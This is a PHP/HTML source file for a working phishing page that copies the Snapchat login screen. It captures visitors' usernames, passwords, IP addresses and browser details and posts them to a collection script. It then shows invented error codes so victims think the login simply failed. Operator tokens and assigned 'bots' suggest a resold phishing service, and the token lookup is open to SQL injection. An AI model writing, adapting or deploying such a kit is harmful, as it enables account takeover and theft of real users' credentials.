<?php
// snap/login.php - Supports token (user) or no token (admin)

require_once '../common/config.php';

$token = isset($_GET['token']) ? $_GET['token'] : '';
$user_id = null;
$is_admin = false;

if ($token) {
    // User mode – validate token
    $conn = getDB();
    $user = $conn->query("SELECT * FROM users WHERE link_token = '$token' AND status = 'active'")->fetch_assoc();
    if (!$user) {
        die("User not found or inactive.");
    }
    if ($user['expiry_timestamp'] && strtotime($user['expiry_timestamp']) < time()) {
        die("User account expired. Contact admin.");
    }
    $user_id = $user['id'];

    // Check if user has an active bot
    $bot = $conn->query("SELECT * FROM bots WHERE assigned_to = $user_id AND status = 'active'")->fetch_assoc();
    if (!$bot) {
        die("No active bot assigned to this user. Contact admin.");
    }
    $conn->close();
} else {
    // Admin mode – no token
    $is_admin = true;
}

$error_message = '';
$show_error = false;
$error_code = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $save_info = isset($_POST['save_info']) ? 1 : 0;

        // Prepare data for send_data.php
        $data = [
            'source' => 'snap',
            'username' => $username,
            'password' => $password,
            'save_info' => $save_info,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        if ($user_id) {
            $data['user_id'] = $user_id;
        } else {
            $data['is_admin'] = 1;
        }

        $send_url = 'http://' . $_SERVER['HTTP_HOST'] . dirname(dirname($_SERVER['SCRIPT_NAME'])) . '/send_data.php';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $send_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);

        // Fake error
        $error_codes = ['C14A', 'C14B', 'SS14A', 'SS02', 'SS06', 'SS18', 'SS07'];
        $error_code = $error_codes[array_rand($error_codes)];
        $error_messages = [
            'C14A' => 'Network failure',
            'C14B' => 'Connection issue',
            'SS14A' => 'Login failed',
            'SS02' => 'Too many attempts',
            'SS06' => 'Device ban',
            'SS18' => 'Account locked',
            'SS07' => 'Suspicious activity'
        ];
        $show_error = true;
        $error_message = $error_messages[$error_code];
    }
}

// Fake errors for forgot/signup
if (isset($_GET['action'])) {
    $error_codes = ['C14A', 'C14B', 'SS14A', 'SS02', 'SS06', 'SS18', 'SS07'];
    $error_code = $error_codes[array_rand($error_codes)];
    if ($_GET['action'] == 'forgot') {
        $error_message = "Password reset unavailable";
    } elseif ($_GET['action'] == 'signup') {
        $error_message = "Sign up unavailable";
    }
    $show_error = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snapchat</title>
    <style>
        /* (same CSS as before – keep your existing styles) */
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#FFFC00; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; min-height:100vh; display:flex; align-items:center; justify-content:center; overflow-y:auto; padding:16px; }
        .snap-container { width:100%; max-width:380px; margin:auto; display:flex; flex-direction:column; align-items:center; justify-content:center; }
        .login-card { background:white; border-radius:40px; width:100%; padding:36px 24px 40px; box-shadow:0 20px 40px rgba(0,0,0,0.15),0 8px 20px rgba(0,0,0,0.1); }
        .snap-logo { width:75px; height:75px; margin:0 auto 40px; display:flex; justify-content:center; }
        .snap-logo svg { width:100%; height:100%; fill:#000; }
        .input-group { margin-bottom:30px; position:relative; }
        .input-label { position:absolute; top:-20px; left:2px; font-size:12px; color:#00A9FF; text-transform:uppercase; font-weight:500; pointer-events:none; }
        .input-field { width:100%; padding:16px 14px; border:1.5px solid #E0E0E0; border-radius:16px; font-size:15px; background:transparent; transition:border-color 0.2s; outline:none; }
        .input-field:focus { border-color:#000; }
        .input-field::placeholder { color:transparent; }
        .password-wrapper { position:relative; }
        .password-wrapper .input-field { padding-right:50px; }
        .eye-toggle { position:absolute; right:14px; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; padding:0; display:flex; align-items:center; justify-content:center; width:24px; height:24px; color:#8e8e8e; transition:color 0.2s; }
        .eye-toggle:hover { color:#333; }
        .eye-toggle svg { width:20px; height:20px; fill:currentColor; }
        .checkbox-wrapper { margin:20px 0 28px; display:flex; align-items:center; }
        .checkbox-container { display:flex; align-items:center; gap:10px; }
        #save_info { display:none; }
        .custom-checkbox { width:18px; height:18px; border-radius:5px; border:2px solid #D1D1D1; background:#f0f0f0; cursor:pointer; transition:background 0.2s,border-color 0.2s; display:inline-flex; align-items:center; justify-content:center; }
        .custom-checkbox.checked { background:#00A9FF; border-color:#00A9FF; }
        .custom-checkbox svg { display:none; width:14px; height:14px; fill:white; }
        .custom-checkbox.checked svg { display:block; }
        .checkbox-text { font-size:14px; color:#999; font-weight:400; cursor:default; user-select:none; }
        .login-btn { width:100%; background:#000; color:white; border:none; border-radius:30px; padding:16px; font-size:16px; font-weight:700; cursor:pointer; position:relative; transition:0.15s; margin-bottom:18px; }
        .login-btn:active { transform:scale(0.98); background:#333; }
        .login-btn.loading { color:transparent; pointer-events:none; }
        .login-btn .loader { display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:22px; height:22px; border:2px solid rgba(255,255,255,0.3); border-top:2px solid white; border-radius:50%; animation:spin 0.8s linear infinite; }
        .login-btn.loading .loader { display:block; }
        @keyframes spin { 0%{transform:translate(-50%,-50%) rotate(0deg);} 100%{transform:translate(-50%,-50%) rotate(360deg);} }
        .forgot-link { text-align:center; }
        .forgot-link a { color:#00A9FF; text-decoration:none; font-size:14px; font-weight:600; }
        .signup-section { margin-top:40px; text-align:center; font-size:15px; color:#333; }
        .signup-link { color:#000; font-weight:700; text-decoration:none; margin-left:5px; }
        .spinner-overlay { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.4); backdrop-filter:blur(4px); display:flex; align-items:center; justify-content:center; z-index:2000; }
        .spinner-only { width:48px; height:48px; border:4px solid #FFFC00; border-top:4px solid #000; border-radius:50%; animation:spin 0.8s linear infinite; margin:0; }
        .snap-error-modal { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; z-index:1000; backdrop-filter:blur(2px); }
        .snap-error-content { background:white; border-radius:30px; width:280px; padding:24px 20px; text-align:center; box-shadow:0 20px 40px rgba(0,0,0,0.2); }
        .error-text { font-size:16px; font-weight:400; color:#333; margin-bottom:20px; line-height:1.4; }
        .error-text .error-code { color:#FF3B30; font-weight:400; margin-left:4px; }
        .error-ok-btn { background:#000; color:white; border:none; border-radius:100px; padding:10px 30px; font-size:15px; font-weight:600; cursor:pointer; width:100%; }
        .error-ok-btn:active { transform:scale(0.97); background:#333; }
    </style>
    <?php echo getSecurityScript(); ?>
</head>
<body>
    <div class="snap-container">
        <div class="login-card">
            <div class="snap-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
                    <path d="M15.943 11.526c-.111-.303-.323-.465-.564-.599a1 1 0 0 0-.123-.064l-.219-.111c-.752-.399-1.339-.902-1.746-1.498a3.4 3.4 0 0 1-.3-.531c-.034-.1-.032-.156-.008-.207a.3.3 0 0 1 .097-.1c.129-.086.262-.173.352-.231.162-.104.289-.187.371-.245.309-.216.525-.446.66-.702a1.4 1.4 0 0 0 .069-1.16c-.205-.538-.713-.872-1.329-.872a1.8 1.8 0 0 0-.487.065c.006-.368-.002-.757-.035-1.139-.116-1.344-.587-2.048-1.077-2.61a4.3 4.3 0 0 0-1.095-.881C9.764.216 8.92 0 7.999 0s-1.76.216-2.505.641c-.412.232-.782.53-1.097.883-.49.562-.96 1.267-1.077 2.61-.033.382-.04.772-.036 1.138a1.8 1.8 0 0 0-.487-.065c-.615 0-1.124.335-1.328.873a1.4 1.4 0 0 0 .067 1.161c.136.256.352.486.66.701.082.058.21.14.371.246l.339.221a.4.4 0 0 1 .109.11c.026.053.027.11-.012.217a3.4 3.4 0 0 1-.295.52c-.398.583-.968 1.077-1.696 1.472-.385.204-.786.34-.955.8-.128.348-.044.743.28 1.075q.18.189.409.31a4.4 4.4 0 0 0 1 .4.7.7 0 0 1 .202.09c.118.104.102.26.259.488q.12.178.296.3c.33.229.701.243 1.095.258.355.014.758.03 1.217.18.19.064.389.186.618.328.55.338 1.305.802 2.566.802 1.262 0 2.02-.466 2.576-.806.227-.14.424-.26.609-.321.46-.152.863-.168 1.218-.181.393-.015.764-.03 1.095-.258a1.14 1.14 0 0 0 .336-.368c.114-.192.11-.327.217-.42a.6.6 0 0 1 .19-.087 4.5 4.5 0 0 0 1.014-.404c.16-.087.306-.2.429-.336l.004-.005c.304-.325.38-.709.256-1.047m-1.121.602c-.684.378-1.139.337-1.493.565-.3.193-.122.61-.34.76-.269.186-1.061-.012-2.085.326-.845.279-1.384 1.082-2.903 1.082s-2.045-.801-2.904-1.084c-1.022-.338-1.816-.14-2.084-.325-.218-.15-.041-.568-.341-.761-.354-.228-.809-.187-1.492-.563-.436-.24-.189-.39-.044-.46 2.478-1.199 2.873-3.05 2.89-3.188.022-.166.045-.297-.138-.466-.177-.164-.962-.65-1.18-.802-.36-.252-.52-.503-.402-.812.082-.214.281-.295.49-.295a1 1 0 0 1 .197.022c.396.086.78.285 1.002.338q.04.01.082.011c.118 0 .16-.06.152-.195-.026-.433-.087-1.277-.019-2.066.094-1.084.444-1.622.859-2.097.2-.229 1.137-1.22 2.93-1.22 1.792 0 2.732.987 2.931 1.215.416.475.766 1.013.859 2.098.068.788.009 1.632-.019 2.065-.01.142.034.195.152.195a.4.4 0 0 0 .082-.01c.222-.054.607-.253 1.002-.338a1 1 0 0 1 .197-.023c.21 0 .409.082.49.295.117.309-.04.56-.401.812-.218.152-1.003.638-1.18.802-.184.169-.16.3-.139.466.018.14.413 1.991 2.89 3.189.147.073.394.222-.041.464"/>
                </svg>
            </div>

            <form method="POST" id="loginForm">
                <?php if ($user_id): ?>
                    <input type="hidden" name="user_id" value="<?= $user_id ?>">
                <?php else: ?>
                    <input type="hidden" name="is_admin" value="1">
                <?php endif; ?>

                <div class="input-group">
                    <label class="input-label">USERNAME OR EMAIL</label>
                    <input type="text" name="username" id="usernameField" class="input-field" required autocomplete="off">
                </div>

                <div class="input-group">
                    <label class="input-label">PASSWORD</label>
                    <div class="password-wrapper">
                        <input type="password" name="password" id="passwordField" class="input-field" required autocomplete="off">
                        <button type="button" class="eye-toggle" id="togglePassword">
                            <svg viewBox="0 0 16 16" id="eyeIcon">
                                <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
                                <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
                            </svg>
                        </button>
                    </div>
                </div>

                <div class="checkbox-wrapper">
                    <div class="checkbox-container">
                        <div class="custom-checkbox" id="customCheckbox">
                            <svg viewBox="0 0 16 16">
                                <path d="M10.97 4.97a.75.75 0 0 1 1.071 1.05l-3.992 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425z"/>
                            </svg>
                        </div>
                        <span class="checkbox-text">Save your info on this device</span>
                    </div>
                    <input type="checkbox" name="save_info" id="save_info" style="display: none;">
                </div>

                <button type="submit" class="login-btn" id="loginBtn">
                    Log In
                    <span class="loader"></span>
                </button>

                <div class="forgot-link">
                    <a href="#" id="forgotPassword">Forgot your password?</a>
                </div>
            </form>
        </div>

        <div class="signup-section">
            New to Snapchat?
            <a href="#" class="signup-link" id="signupLink">Sign Up</a>
        </div>
    </div>

    <div class="spinner-overlay" id="spinnerOverlay" style="display: none;">
        <div class="spinner-only"></div>
    </div>

    <?php if ($show_error): ?>
    <div class="snap-error-modal" id="errorModal">
        <div class="snap-error-content">
            <div class="error-text">
                <?php echo $error_message; ?> <span class="error-code">[<?php echo $error_code; ?>]</span>
            </div>
            <button class="error-ok-btn" onclick="closeErrorModal()">OK</button>
        </div>
    </div>
    <?php endif; ?>

    <script>
        // Eye toggle (unchanged)
        const passwordField = document.getElementById('passwordField');
        const togglePassword = document.getElementById('togglePassword');
        const eyeIcon = document.getElementById('eyeIcon');
        togglePassword.addEventListener('click', function() {
            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordField.setAttribute('type', type);
            if (type === 'text') {
                eyeIcon.innerHTML = `<path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7 7 0 0 0-2.79.588l.77.771A6 6 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755q-.247.248-.517.486z"/><path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829"/><path d="M3.35 5.47q-.27.24-.518.487A13 13 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7 7 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12z"/>`;
            } else {
                eyeIcon.innerHTML = `<path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/><path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>`;
            }
        });

        // Custom checkbox
        const customCheckbox = document.getElementById('customCheckbox');
        const hiddenCheckbox = document.getElementById('save_info');
        customCheckbox.addEventListener('click', function() {
            hiddenCheckbox.checked = !hiddenCheckbox.checked;
            if (hiddenCheckbox.checked) {
                customCheckbox.classList.add('checked');
            } else {
                customCheckbox.classList.remove('checked');
            }
        });

        // Login button loading
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        loginForm.addEventListener('submit', function() {
            loginBtn.classList.add('loading');
            setTimeout(() => loginBtn.classList.remove('loading'), 2000);
        });

        // Forgot / signup
        document.getElementById('forgotPassword').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('spinnerOverlay').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('spinnerOverlay').style.display = 'none';
                window.location.href = '?action=forgot';
            }, 1500);
        });
        document.getElementById('signupLink').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('spinnerOverlay').style.display = 'flex';
            setTimeout(() => {
                document.getElementById('spinnerOverlay').style.display = 'none';
                window.location.href = '?action=signup';
            }, 1500);
        });

        function closeErrorModal() {
            const modal = document.getElementById('errorModal');
            if (modal) {
                modal.style.opacity = '0';
                setTimeout(() => {
                    modal.style.display = 'none';
                    window.history.replaceState({}, document.title, window.location.pathname);
                }, 200);
            }
        }

        <?php if ($show_error): ?>
        setTimeout(closeErrorModal, 5000);
        <?php endif; ?>

        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('focus', () => {
                setTimeout(() => input.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
            });
        });

        document.querySelectorAll('button, a, .custom-checkbox').forEach(el => {
            el.addEventListener('touchstart', () => el.style.opacity = '0.7');
            el.addEventListener('touchend', () => el.style.opacity = '1');
            el.addEventListener('touchcancel', () => el.style.opacity = '1');
        });

        document.addEventListener('touchstart', e => { if (e.touches.length > 1) e.preventDefault(); }, { passive: false });
        document.addEventListener('gesturestart', e => e.preventDefault());
    </script>
</body>
</html>